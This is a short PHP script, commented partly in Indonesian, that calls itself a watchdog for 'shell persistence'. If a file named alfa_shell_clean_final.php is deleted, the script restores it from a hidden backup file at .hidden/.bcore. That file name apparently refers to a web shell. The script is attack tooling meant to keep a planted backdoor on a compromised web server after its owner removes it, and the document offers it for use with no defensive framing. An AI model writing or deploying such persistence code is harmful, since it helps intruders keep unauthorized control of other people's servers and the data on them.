<?php
// Simple watchdog script for shell persistence
$shell = "alfa_shell_clean_final.php";
$backup = ".hidden/.bcore";

// Jika shell utama tidak ada, restore dari backup
if (!file_exists($shell)) {
    if (file_exists($backup)) {
        copy($backup, $shell);
        touch($shell);
    }
}
?>
